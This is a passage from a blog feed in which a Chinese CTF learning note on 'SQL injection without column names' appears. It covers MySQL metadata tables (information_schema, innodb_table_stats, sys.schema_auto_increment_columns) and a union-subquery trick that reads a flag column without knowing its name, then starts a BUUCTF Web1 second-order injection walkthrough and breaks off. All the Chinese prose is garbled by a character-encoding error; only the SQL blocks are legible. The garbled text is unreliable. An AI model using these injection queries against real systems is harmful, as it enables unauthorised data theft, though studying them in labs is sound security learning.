å…¥å˜é‡çš„åœ°å€äº†ã€‚</p><p><strong>åç»­çš„å†…å®¹éœ€è¦èŠ±è´¹ä¸€äº›æ—¶é—´ï¼ŒçŸ­æ—¶é—´å†…å…ˆæ”¾æ”¾ï¼Œæš‚æ—¶æ”¾ä¸‹ä¸ç®¡ï¼Œä¹‹åæœ‰æ—¶é—´å†æ¥è¡¥å……ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ— åˆ—åæ³¨å…¥</title>
      <link href="/posts/384200ef.html"/>
      <url>/posts/384200ef.html</url>
      
        <content type="html"><![CDATA[<h1 id="sqlæ— åˆ—åæ³¨å…¥"><a class="markdownIt-Anchor" href="#sqlæ— åˆ—åæ³¨å…¥">#</a> SQL æ— åˆ—åæ³¨å…¥</h1><p>â€‹å‰æ®µæ—¶é—´ï¼Œé˜Ÿé‡ŒæŸä½å¤§ä½¬å‘äº†ä¸€ä¸ªå…³äº sql æ³¨å…¥æ— åˆ—åçš„æ–‡ç« ï¼Œæ„Ÿè§‰å¥½åƒå¾ˆæœ‰ç”¨ï¼Œç‰¹åœ°ç ”ç©¶ä¸‹ã€‚</p><h2 id="å…³äº-information_schema-æ•°æ®åº“"><a class="markdownIt-Anchor" href="#å…³äº-information_schema-æ•°æ®åº“">#</a> å…³äº information_schema æ•°æ®åº“ï¼š</h2><p>â€‹å¯¹äºè¿™ä¸€ä¸ªåº“ï¼Œæˆ‘æ‰€çŸ¥æ™“çš„å†…å®¹å¹¶ä¸å¤šï¼Œå¹¶ä¸”ä¹‹å‰æ€»ç»“ SQL æ³¨å…¥çš„æ—¶å€™å¿˜è®°è¯´è¿™ä¸ªæ•°æ®åº“äº†ï¼Œåœ¨è¿™é‡Œè¡¥å……ä¸€ä¸‹ï¼Œç®€å•ç‚¹å„¿æ¥è¯´ï¼Œå°±æ˜¯è¿™ä¸ªæ•°æ®åº“ä¸­çš„æŸäº›è¡¨å­˜æ”¾ç€æ•°æ®åº“çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œæˆ‘ç”µè„‘ä¸­æ‰€æœ‰çš„æ•°æ®åº“ä¸­å­˜åœ¨å¦‚ä¸‹çš„å‡ ä¸ªæ•°æ®åº“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sakila             |</span><br><span class="line">| sys                |</span><br><span class="line">| test               |</span><br><span class="line">| world              |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æŸ¥ information_schema ä¸­çš„  SCHEMATA è¡¨ä¸­çš„ SCHEMA_NAME å­—æ®µå¯ä»¥å¾—åˆ°æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select SCHEMA_NAME from SCHEMATA;</span><br><span class="line">+--------------------+</span><br><span class="line">| SCHEMA_NAME        |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql              |</span><br><span class="line">| information_schema |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| sakila             |</span><br><span class="line">| world              |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹åŒæ—¶ï¼Œtables è¿™ä¸ªè¡¨ä¸­å­˜åœ¨å¾ˆå¤šå…³äºè¡¨çš„å†…å®¹çš„å­—æ®µï¼Œä¾‹å¦‚ï¼š</p><p>â€‹table_schemaï¼Œè¿™ä¸ªå­—æ®µç”¨äºå­˜æ”¾æŸå¼ è¡¨å±äºå“ªä¸€ä¸ªæ•°æ®åº“çš„å­—æ®µã€‚</p><p>â€‹table_nameï¼Œ è¿™ä¸ªå­—æ®µç”¨äºå­˜æ”¾æ‰€æœ‰çš„è¡¨çš„åå­—</p><p>â€‹å¦‚æœæƒ³è¦æŸ¥åˆ°æŸä¸ªæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åï¼Œåˆ™éœ€è¦æŸ¥è¯¢ table_name è¿™ä¸ªå­—æ®µï¼Œç„¶åç”¨ where æ¥é™åˆ¶ table_schema æŸ¥æ‰¾å¯¹åº”çš„æ•°æ®åº“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from TABLES where table_schema=&#x27;test&#x27;;</span><br><span class="line">+------------+</span><br><span class="line">| TABLE_NAME |</span><br><span class="line">+------------+</span><br><span class="line">| questions  |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å¦å¤–ï¼Œinformation_schema åº“ä¸­è¿˜æœ‰ä¸€å¼  columns è¡¨ï¼Œè¿™é‡Œé¢å­˜çš„æ˜¯æ‰€æœ‰å­—æ®µçš„ä¿¡æ¯ï¼Œcolumns è¡¨ä¸­å­˜åœ¨ table_name , table_schema , column_name å¯¹äº table_schemaï¼Œè¿™é‡Œé¢åˆ™æ˜¯æ‰€æœ‰å­—æ®µæ‰€åœ¨è¡¨çš„åå­—ï¼Œè€Œ table_schema åˆ™æ˜¯å­˜æ”¾äº†æ‰€æœ‰å­—æ®µçš„è¡¨æ‰€åœ¨çš„æ•°æ®åº“çš„åå­—ï¼Œå¦å¤–ï¼Œcolumn_name åˆ™æ˜¯å­˜æ”¾äº†æ‰€æœ‰çš„å­—æ®µçš„åå­—ï¼Œå› æ­¤ï¼Œæƒ³è¦æŸ¥è¯¢åˆ°æŸä¸ªæ•°æ®åº“ä¸­æ‰€æœ‰å­—æ®µçš„åå­—ï¼Œæˆ–è€…æŸå¼ è¡¨çš„æ‰€æœ‰çš„å­—æ®µçš„åå­—åˆ™å¯ä»¥ç”¨å¦‚ä¸‹çš„å‘½ä»¤æŸ¥æ‰¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from columns where table_schema=&#x27;test&#x27;; #æŸ¥è¯¢æŸä¸ªåº“é‡Œé¢æ‰€æœ‰çš„å­—æ®µçš„åå­—</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| answer      |</span><br><span class="line">| id          |</span><br><span class="line">| quest       |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select column_name from columns where table_name=&#x27;questions&#x27;; #æŸ¥è¯¢æŸå¼ è¡¨ä¸­æ‰€æœ‰å­—æ®µçš„å†…å®¹ï¼ˆç”±äºè¿™ä¸ªåº“ä¸­åªæœ‰ä¸€å¼ è¡¨ï¼Œæ‰€ä»¥ç»“æœä¸€æ ·ï¼‰</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| answer      |</span><br><span class="line">| id          |</span><br><span class="line">| quest       |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="å…³äºinnodbå¼•æ“"><a class="markdownIt-Anchor" href="#å…³äºinnodbå¼•æ“">#</a> å…³äº InnoDb å¼•æ“ï¼š</h2><p>â€‹<strong>æˆ‘ä¸çŸ¥é“è¿™ä¸ªå…·ä½“æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯è®°å½•ä¸€ä¸‹ï¼Œæœ‰æ¡ä»¶å†æ‹¿æ¥ç ”ç©¶çœ‹çœ‹ã€‚</strong></p><p>ä» MYSQL5.5.8 å¼€å§‹ï¼ŒInnoDB æˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨ MYSQL5.6 ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œmysql æ•°æ®åº“ä¸­ inndb å¢åŠ äº† innodb_index_stats å’Œ innodb_table_stats ä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚å…¶åˆ©ç”¨æ–¹å¼æ˜¯ï¼šmysql.innodb_index_stats å’Œ mysql.innodb_table_stats</p><p>â€‹ä¾æ—§æ‹¿ä¸Šé¢çš„é‚£å¼ è¡¨ä½œä¸ºå»¶æ—¶ï¼Œä¹Ÿå°±æ˜¯ test åº“é‡Œé¢çš„ questions è¿™å¼ è¡¨ã€‚</p><p>â€‹å†<strong> mysql</strong> è¿™ä¸ªæ•°æ®åº“ç§å­˜åœ¨ä¸¤å¼ è¡¨ï¼Œé‡Œé¢åˆ†åˆ«å­˜æ”¾äº†ä¸€äº›å†…å®¹ï¼Œä¾‹å¦‚ï¼Œ<strong>innodb_table_stats</strong> è¿™ä¸ªè¡¨ï¼Œå­˜æ”¾çš„æ˜¯æ‰€æœ‰çš„è¡¨åï¼Œä¹Ÿå°±æ˜¯<strong> database_name</strong> è¿˜æœ‰<strong> table_name</strong> è¿™ä¸¤å¼ è¡¨ï¼Œä½†æ˜¯æ²¡æœ‰å­˜æ”¾åˆ—åï¼Œå› æ­¤ï¼Œè¿™é‡Œå¯ä»¥è¯•ç€è®¿é—®ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from innodb_table_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| ctfer         | users      | 2024-03-02 16:37:10 |      0 |                    1 |                        0 |</span><br><span class="line">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å†ç„¶åå°±æ˜¯<strong> mysql</strong> æ•°æ®åº“ä¸­çš„<strong> innodb_index_stats</strong> è¡¨ï¼Œé‡Œé¢æˆ‘æ€»ç»“ä¸å‡ºæ¥å…·ä½“æ˜¯ä»€ä¹ˆä¿¡æ¯ï¼Œä½†æ˜¯é‡Œé¢å­˜æ”¾æœ‰æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯<strong> database_name</strong> è¿˜æœ‰<strong> table_name</strong> è¿™ä¸¤å¼ è¡¨ï¼Œä¸è¿‡ï¼Œè¿˜æ˜¯æ²¡æœ‰å­˜æ”¾å­—æ®µçš„ä¿¡æ¯ï¼Œè¿™é‡Œå¯ä»¥è¯•ç€è®¿é—®ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from innodb_index_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| database_name | table_name | index_name      | last_update         | stat_name    | stat_value | sample_size | stat_description                  |</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_diff_pfx01 |          0 |           1 | DB_ROW_ID                         |</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="å…³äºsysæ•°æ®åº“"><a class="markdownIt-Anchor" href="#å…³äºsysæ•°æ®åº“">#</a> å…³äº sys æ•°æ®åº“ï¼š</h2><p>åœ¨ 5.7 ä»¥ä¸Šçš„ MYSQL ä¸­ï¼Œæ–°å¢äº† sys æ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ª information_schema å’Œ performance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„ schema_auto_increment_columns æ¥è·å–è¡¨åã€‚å…¶ç”¨æ³•æ˜¯ sys.schema_auto_increment_columns</p><p>â€‹åœ¨<strong> sys</strong> æ•°æ®åº“ç§ï¼Œå­˜åœ¨ä¸€ä¸ª<strong> schema_auto_increment_columns</strong> è¡¨ï¼Œé‡Œé¢å­˜åœ¨å‡ ä¸ªå­—æ®µï¼Œç”¨äºå­˜æ”¾æ•°æ®åº“åå’Œè¡¨åä»¥åŠå­—æ®µåï¼Œæœ‰<strong> table_schema</strong> ä»¥åŠ<strong> table_name</strong> è¿˜æœ‰<strong> column_name</strong>ï¼Œä½†æ˜¯ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œ<strong>æˆ‘è¿™é‡ŒæŸ¥è¯¢åˆ°çš„å†…å®¹å¹¶ä¸å®Œå…¨ï¼Œå°‘äº†å¾ˆå¤šå†…å®¹ï¼Œä¸è¿‡è¿˜æ˜¯å…ˆä»åœ¨è¿™å„¿å§</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from schema_auto_increment_columns;</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">| table_schema | table_name | column_name  | data_type | column_type        | is_signed | is_unsigned | max_value  | auto_increment | auto_increment_ratio |</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">| sakila       | payment    | payment_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |          16049 |               0.2449 |</span><br><span class="line">| sakila       | category   | category_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |             16 |               0.0627 |</span><br><span class="line">| sakila       | language   | language_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              6 |               0.0235 |</span><br><span class="line">| sakila       | film       | film_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |           1000 |               0.0153 |</span><br><span class="line">| sakila       | address    | address_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            605 |               0.0092 |</span><br><span class="line">| sakila       | city       | city_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |            600 |               0.0092 |</span><br><span class="line">| sakila       | customer   | customer_id  | smallint  | smallint unsigned  |         0 |           1 |      65535 |            599 |               0.0091 |</span><br><span class="line">| sakila       | staff      | staff_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class="line">| sakila       | store      | store_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class="line">| sakila       | actor      | actor_id     | smallint  | smallint unsigned  |         0 |           1 |      65535 |            200 |               0.0031 |</span><br><span class="line">| sakila       | country    | country_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            109 |               0.0017 |</span><br><span class="line">| sakila       | inventory  | inventory_id | mediumint | mediumint unsigned |         0 |           1 |   16777215 |           4581 |               0.0003 |</span><br><span class="line">| sakila       | rental     | rental_id    | int       | int                |         1 |           0 | 2147483647 |          16049 |               0.0000 |</span><br><span class="line">| world        | city       | ID           | int       | int                |         1 |           0 | 2147483647 |           4079 |               0.0000 |</span><br><span class="line">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class="line">14 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h2 id="æ— åˆ—åæ³¨å…¥union"><a class="markdownIt-Anchor" href="#æ— åˆ—åæ³¨å…¥union">#</a> æ— åˆ—åæ³¨å…¥â€“unionï¼š</h2><h3 id="åŸç†"><a class="markdownIt-Anchor" href="#åŸç†">#</a> åŸç†ï¼š</h3><p>â€‹ä¾‹å¦‚ï¼Œå¯¹äºå¦‚ä¸‹çš„ä¸€ä¸ªè¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from usersï¼›</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| username | password  | flag                              |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+----------+-----------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å¦‚æœæˆ‘ä»¬æƒ³è¦è¿›è¡ŒæŸ¥è¯¢ï¼Œé‚£ä¹ˆåˆ™éœ€è¦è¡¨æ˜ï¼Œç”šè‡³æ˜¯åº“åï¼Œä¸è¿‡ï¼Œå¯ä»¥é€šè¿‡ table_schema=database () æ¥æŒ‡å®šåº“åï¼Œå› æ­¤ï¼Œæƒ³è¦æŸ¥è¯¢å†…å®¹ï¼Œåˆ™è¡¨åä¼¼ä¹æˆä¸ºäº†å¿…é¡»çš„å†…å®¹ï¼Œä½†æ˜¯ï¼Œåœ¨è¿›è¡Œ sql æ³¨å…¥çš„æ—¶å€™ï¼Œæœ‰çš„æ—¶å€™ä¼šå¯¹ information è¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤ï¼Œåˆ™æ— æ³•åšé¢˜ï¼Œé‚£ä¹ˆï¼Œè¿™é‡Œåˆ™éœ€è¦åˆ©ç”¨ union çš„æ–¹å¼è¿›è¡Œæ— åˆ—åçš„æ³¨å…¥ã€‚</p><p>â€‹å¦‚æœæˆ‘ä»¬æƒ³è¦æŸ¥è¯¢åˆ°è¿™ä¸ª flag çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æˆ–è®¸å¯ä»¥è€ƒè™‘å°†å­—æ®µä¿®æ”¹ä¸ºæˆ‘ä»¬èƒ½å¤ŸæŸ¥è¯¢åˆ°çš„å­—æ®µï¼Œæ¯”å¦‚ï¼Œ1ã€2ã€3ï¼Œæ‰€ä»¥ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åšä¸ªå°è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2,3  union select * from users;</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">| 1      | 2         | 3                                 |</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">| 1      | 2         | 3                                 |</span><br><span class="line">| xiaomi | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+--------+-----------+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™é‡Œé€šè¿‡ä¸¤æ¬¡æŸ¥è¯¢ï¼Œç¬¬ä¸€æ¬¡æŸ¥è¯¢äº† 1ï¼Œ2ï¼Œ3 ä¸‰ä¸ªå­—æ®µï¼Œç¬¬äºŒæ¬¡æŸ¥è¯¢äº† users è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼Œç„¶åå°† users è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µè”åˆåœ¨ç¬¬ä¸€æ¬¡æŸ¥è¯¢åˆ°çš„å­—æ®µä¸­è¾“å‡ºå‡ºæ¥ï¼Œæ ¹æ®è¿™ç§æƒ…å†µï¼Œä¸‹é¢åˆ™æœ‰ä¸¤ç§æ–¹å¼æŸ¥è¯¢åˆ° flag çš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `3` from (select 1,2,3 union select * from users)a; #è”åˆäº†1ï¼Œ2ï¼Œ3ä¹‹åï¼Œå¦‚æœç”¨æ•°å­—æŸ¥è¯¢çš„è¯éœ€è¦ç”¨åå¼•å·æ¥è¡¨ç¤ºå¼•ç”¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå€¼</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2,3 as b union select * from users)a; #è¿™é‡Œé€šè¿‡3 as b çš„æ–¹å¼ç»™å­—æ®µ3é‡å‘½åä¸ºbï¼Œç„¶åå†è¿›è¡Œæ’å™</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| b                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 3                                 |</span><br><span class="line">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šè¿™é‡Œä¸çŸ¥é“ä¸ºä½•éœ€è¦åœ¨æ‹¬å·å¤–é¢éšæ„å†™ä¸€äº›å­—ç¬¦ï¼Œå¦‚æœæœ‰çŸ¥é“çš„è¯è¯·å¸®å¿™è®²è§£ä¸€ä¸‹ã€‚</strong></p><h3 id="é¢˜ç›®æ¡ˆä¾‹buuctf-swpu2019web1"><a class="markdownIt-Anchor" href="#é¢˜ç›®æ¡ˆä¾‹buuctf-swpu2019web1">#</a> é¢˜ç›®æ¡ˆä¾‹â€“BUUCTF----[SWPU2019] Web1ï¼š</h3><p>â€‹åˆšæ‹¿åˆ°è¿™é“é¢˜çš„æ—¶å€™ï¼Œæˆ‘æ˜¯ä¸€ç‚¹å„¿æ€è·¯éƒ½æ²¡æœ‰ï¼Œå…¨ç§°é»‘äººé—®å·ï¼Œå³ä½¿è¿™é“è¿™é“é¢˜çš„è€ƒç‚¹æ˜¯ sql æ³¨å…¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå®Œå…¨æ‰¾ä¸åˆ°ä¸‹æ‰‹çš„ç‚¹ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/3e1023f3f67e4d3fac843a2f1486c2a9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æœ€å¼€å§‹ï¼Œä¸€ä¸ªç™»é™†æ¡†ä¸€åº¦è®©æˆ‘è®¤ä¸ºæ˜¯ sql æ³¨å…¥çš„ä¸‡èƒ½å¯†ç ï¼Œç»“æœä¸æ˜¯ï¼Œå¼±å¯†ç ï¼ŸçŒœäº†å‡ ä¸ªä¹Ÿæ²¡æ‰å‡ºæ¥ï¼Œå› æ­¤ï¼Œå¯ä»¥æ’é™¤æ˜¯å¼±å¯†ç ä»¥åŠä¸‡èƒ½å¯†ç äº†ï¼Œè·Ÿç€ dalao ä»¬çš„ wp åšï¼Œå‘ç°è¿™é‡Œå¯ä»¥ç›´æ¥æ³¨å†Œä¸€ä¸ªé admin çš„è´¦å·ï¼Œå¥½å§ï¼Œæˆ‘äººå‚»äº†ï¼Œé‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸‹ï¼Œè´¦å· qweï¼Œå¯†ç  123456ï¼Œç™»å½•ã€‚</p><p>â€‹ç™»å½•ä¹‹åæ˜¯è¿™æ ·çš„ä¸€ä¸ªå†…å®¹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/093d175444854bd3988bb876439407a9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œï¼Œä¼¼ä¹èƒ½ç‚¹çš„è¶…é“¾æ¥åªæœ‰ä¸€ä¸ªç”³è¯·å‘å¸ƒå¹¿å‘Šï¼Œä¸‹é¢é‚£ä¸€ä¸ªç‚¹äº†ä¹‹åä¼¼ä¹å°±é€€å‡ºç™»å½•äº†ï¼Œæ˜¾ç„¶æ˜¯é”™çš„ï¼Œæ‰€ä»¥ç‚¹ä¸€ä¸‹ç”³è¯·å‘å¸ƒå¹¿å‘Šï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b146d1cf26474ba899ca67be5f4fca2f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å‡ºç°äº†è¿™æ ·çš„ä¸€ä¸ªé¡µé¢ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªåˆä»£è¡¨äº†ä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœä¸æ˜¯æ˜ç¡®åœ°æŒ‡å‡ºè¿™é“é¢˜æ˜¯ sql æ³¨å…¥çš„è¯ï¼Œæˆ‘å¯èƒ½è¿˜æ˜¯ä¼šæ— è„‘è®¤ä¸ºè¿™ä¸ªé¢˜ç›®æ˜¯ä¸€é“ XSS çš„æ¼æ´ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªåˆ°åº•æ˜¯ä¸ªå•¥ï¼Ÿ</p><p>â€‹çœ‹äº†ä¸‹ dalao ä»¬çš„ wpï¼Œè¯´çš„æ˜¯è¿™æ˜¯ä¸€é“äºŒæ¬¡æ³¨å…¥ï¼Œæ˜¯ä¸€é“æˆ‘æ²¡æœ‰é‡åˆ°è¿‡çš„æ¼æ´ã€‚</p><h4 